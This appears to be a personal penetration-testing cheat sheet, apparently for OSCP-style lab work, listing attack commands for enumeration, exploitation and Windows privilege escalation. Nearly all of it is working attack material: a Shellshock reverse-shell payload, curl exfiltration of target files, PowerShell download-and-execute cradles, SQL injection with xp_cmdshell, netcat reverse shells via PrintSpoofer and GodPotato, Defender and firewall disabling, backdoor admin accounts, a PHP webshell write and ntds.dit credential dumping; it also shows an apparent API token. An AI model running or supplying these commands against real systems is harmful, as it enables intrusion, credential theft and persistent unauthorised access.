Dump Secrets Such as SYSTEM and ntds.dit:

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM -sam SAM LOCAL
```
192.168.49.140
Discovery:

```bash
sudo nmap $ip -p- -T5 --open
ports=$(nmap -p- --min-rate 1000 "$target" | grep "^ *[0-9]" | grep "open" | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
sudo autorecon $ip --ports="$ports" --wpscan.api-token KvAyO8bM4TYYDwJJMNhoU95g591rdNvk3jiKpQHG5uY --subdomain-enum.domain hack.htb --global.domain hack.htb
```

Shellshock:

```bash
nikto -ask=no -h http://10.11.1.71:80 2>&1
OSVDB-112004: /cgi-bin/admin.cgi: Site appears vulnerable to the 'shellshock' vulnerability

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.119.183/9001 0>&1'" \
http://10.11.1.71:80/cgi-bin/admin.cgi
```

Local port forward:

```bash
https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel
ssh -i id_ecdsa userE@192.168.138.246 -p 2222 -L 8000:localhost:8000 -N
# On the box running on port 80, want it to be on my machine
ssh -f -N -L 127.0.0.1:8080:127.0.0.1:80 ariah@192.168.239.99
ssh -N -L <your machine>:<your port>:<where \'s running on their machine>:<... port> user@$ip
ssh -N -L 127.0.0.1:8444:127.0.0.1:8443 nadine@$ip
```

Access remote localhost with Chisel:

```bash
# Remote machine has internal program running on 8080
chisel server -p 5000 --reverse
cd /opt/linux
python -m http.server 80

wget 192.168.45.178:8000/chisel
chmod 777 chisel
./chisel client 192.168.45.221:5000 R:4444:localhost:8080

wget 10.10.14.11:8000/chisel
chmod 777 chisel
./chisel client 10.10.14.11:5000 R:8000:127.0.0.1:8000

# Now i can access it on local machine port 4444
```

Elevate privileges of a user you have access to with a single command:

```bash
Add-LocalGroupMember -Group Administrators -Member ariah
```

Custom password list:

```bash
cewl -g --with-numbers -d 20 $url |grep -v CeWL > custom-wordlist.txt
cat users.txt >> custom-wordlist.txt
echo "summer\nwinter\nspring\nfall\n$dom" >> custom-wordlist.txt
hashcat --stdout -a 0 -r ~/repos/offsec/customizations/bdg.rule custom-wordlist.txt | awk '!a[$0]++ {print $0}' >> custom-passwords.txt

hashcat --stdout -a 0 -r /usr/share/hashcat/rules/best64.rule pass.txt > pass-best64.txt
hashcat --stdout -a 0 -r /usr/share/hashcat/rules/bdg.rule pass.txt > passwords.txt
awk 'length($0) >= 7' passwords.txt > tmp_passwords.txt && awk 'NR==FNR {a[$1]; next} {for (i in a) print $1 ":" i}' tmp_passwords.txt users.txt | grep -P '[A-Z]' | grep -P '[^a-zA-Z0-9]' > combined.txt && rm tmp_passwords.txt
cat combined.txt| /opt/kerbrute bruteforce -d $dom --dc $ip -t 10 - 
```

Transfer files.

```bash
impacket-smbserver -smb2support newShare . -username test -password test
net use z: \\192.168.49.140\newShare /u:test test
copy z:\PowerUpSQL.ps1 .
copy Database.kdbx z:\
```

Import ADModule.

```bash
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
```

Execute powershell file non-interactively.

```bash
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1
```

Run le as another user with powershell.

```bash
echo $username = '$target' > runas.ps1
echo $securePassword = ConvertTo-SecureString '$targetPass' -AsPlainText -Force >> runas.ps1
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
```

Send file contents of file on target to your own server.

```bash
curl --data @/tmp/output http://$myip:8080/
```

Find process running on port.

```bash
sudo lsof -i :2345
kill -9 pid

netstat -a -b # Not specific port
Get-Process -Id (Get-NetTCPConnection -LocalPort port).OwningProcess
Get-NetTCPConnection -LocalPort 8080 | Select-Object -Property OwningProcess | Get-Process
```

Investigate Process.

```bash
Get-NetTCPConnection | Where-Object { $_.State -eq "LISTEN" } | select @{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName}}, 127.0.0.1, 8000
Get-Process -Id (Get-NetTCPConnection -LocalPort 8000).OwningProcess
Get-Process -Id (Get-NetUDPEndpoint -LocalPort 8000).OwningProcess
netstat -a -b
```

Creating an alias with PowerShell.

```bash
Set-Alias -Name exiftool -Value "C:\Users\Administrator\Desktop\exiftool-12.92_64\exiftool-12.92_64\exiftool.exe"
```

Code execution with Powershell.

```bash
powershell -exec bypass iex (new-object net.webclient).downloadstring('http://192.168.x.y/run.txt')
```

Automated tools.

```bash
.\winpeas.exe searchall domain
.\LaZagne.exe all
. .\PowerView.ps1
. .\PowerUp.ps1
. .\Invoke-SessionGopher.ps1
.\amorous.ps1
.\Seatbelt.exe -group=all -full
.\Snaffler.exe -o snaffled.txt -s -m c:\Users -d oscp.exam -u -c $dcip -r 10000000 -l 100000000
.\winpspy.exe
Invoke-AllChecks
Invoke-SessionGopher -Thorough
```

```bash
admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
'
iex(iwr -uri 192.168.45.178:8000/transfer_files.ps1 -usebasicparsing)
iex(iwr -uri 10.10.14.8:8000/transfer_files.ps1 -usebasicparsing)
curl 10.10.14.8:8000/nc.exe -o nc.exe

Get-NetTCPConnection -LocalPort 49681 | Select-Object -Property OwningProcess | Get-Process

iex(iwr -uri 192.168.49.140:8000/nc.exe -usebasicparsing)
transfer_files.ps1
iwr -uri 192.168.45.178:8000/Certify.exe -usebasicparsing -outfile c:\windows\tasks\Certify.exe

iex(iwr -uri 10.10.112.153:1234/transfer_files_ad.ps1 -usebasicparsing)
certutil.exe -f -urlcache -split http://192.168.45.221:8000/svc_mssql443.exe svc_mssql443.exe
wget http://192.168.45.178:8000/pspy64 -O /dev/shm/pspy;chmod +x /dev/shm/pspy;
certutil.exe -f -urlcache -split http://192.168.45.221:8000/
192.168.49.140
# Uploaded nc.exe from /usr/share/windows-resources/binaries/nc.exe
.\PrintSpoofer64.exe -c ".\nc.exe -e cmd.exe 192.168.45.221 80"

.\PrintSpoofer64.exe -i -c C:\Windows\Tasks\binary.exe

.\GodPotato-NET2.exe -cmd ".\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.221 8081"
.\GodPotato-NET4.exe -cmd ".\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.221 8081"

Start-Process -NoNewWindow .\shell443.exe

Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:ms01.oscp.exam"

powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML"
```


```bash
# Create Another Admin for RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
#Enable Remote Desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
::netsh firewall set service remotedesktop enable #I found that this line is not needed
::sc config TermService start= auto #I found that this line is not needed
::net start Termservice #I found that this line is not needed

#Enable Remote Desktop with wmic
wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
##or
wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"

#Enable Remote assistance:
reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service remoteadmin enable

#Ninja combo (New Admin User, RDP + Rassistance + Firewall allow)
net user hacker Hacker123! /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable

netsh advfirewall set allprofiles state off
net user /add backdoor Password123!
net localgroup administrators /add backdoor
net localgroup "Remote Desktop Users" backdoor /add
xfreerdp /v:192.168.140.101 /u:backdoor /p:Password123 /cert:ignore +clipboard

curl http://192.168.45.163:8000/linpeas.sh -o linpeas.sh;chmod +x linpeas.sh;
curl http://192.168.45.163:8000/pspy64 -o pspy64;chmod +x pspy64;./pspy64
```

```bash
===Nmap====
nmap -p- -sT -sV -A $ip
nmap -p- -sC -sV $ip --open
nmap -p- --script=vuln $ip
###HTTP-Methods
nmap --script http-methods --script-args http-methods.url-path='/website' 
###  --script smb-enum-shares
sed IPs:
grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' FILE

================================================================================
===WPScan & SSL
wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u

===WPScan Brute Forceing:
wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt

===Aggressive Plugin Detection:
wpscan --url $URL --enumerate p --plugins-detection aggressive
================================================================================
===Nikto with SSL and Evasion
nikto --host $ip -ssl -evasion 1
SEE EVASION MODALITIES.
================================================================================
===dns_recon
dnsrecon –d yourdomain.com
================================================================================
===gobuster directory
gobuster dir -u http://$ip/ -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -k -t 30

===gobuster files
gobuster dir -u http://$ip/ -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -k -t 30 -x txt,pdf,config

===gobuster for SubDomain brute forcing:
gobuster dns -d domain.org -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
"just make sure any DNS name you find resolves to an in-scope address before you test it"
================================================================================
===Extract IPs from a text file.
grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' nmapfile.txt
================================================================================
===Wfuzz XSS Fuzzing============================================================
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-BruteLogic.txt "$URL"
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt "$URL"

===COMMAND INJECTION WITH POST DATA
wfuzz -c -z file,/opt/SecLists/Fuzzing/command-injection-commix.txt -d "doi=FUZZ" "$URL"

===Test for Paramter Existence!
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt "$URL"

===AUTHENTICATED FUZZING DIRECTORIES:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d "SESSIONID=value" "$URL"

===AUTHENTICATED FILE FUZZING:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -d "SESSIONID=value" "$URL"

===FUZZ Directories:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"

wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/combined_directories.txt --hc 404 "$URL"

===FUZZ FILES:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
|
LARGE WORDS:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-words.txt --hc 404 "$URL"
|
USERS:
wfuzz -c -z file,/opt/SecLists/Usernames/top-usernames-shortlist.txt --hc 404,403 "$URL"

Proxying File/Dirbusting
http 192.168.235.224 steve Password123!
proxychains wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-small-files-lowercase.txt --hc 404 "http://127.0.0.1:8000/FUZZ"
===Command Injection with commix, ssl, waf, random agent.
commix --url="https://supermegaleetultradomain.com?parameter=" --level=3 --force-ssl --skip-waf --random-agent

===SQLMap
sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
sqlmap -u $URL --threads=2 --time-sec=10 --level=4 --risk=3 --dump
/SecLists/Fuzzing/alphanum-case.txt

===Social Recon
theharvester -d domain.org -l 500 -b google

===Nmap HTTP-methods
nmap -p80,443 --script=http-methods  --script-args http-methods.url-path='/directory/goes/here'

===SMTP USER ENUM
smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $ip
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $ip
smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $ip
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $ip


===Command Execution Verification - [Ping check]
tcpdump -i any -c5 icmp

#Check Network
netdiscover /r 0.0.0.0/24

#INTO OUTFILE D00R
SELECT “” into outfile “/var/www/WEROOT/backdoor.php”;

LFI?
#PHP Filter Checks.
php://filter/convert.base64-encode/resource=

UPLOAD IMAGE?
GIF89a1
```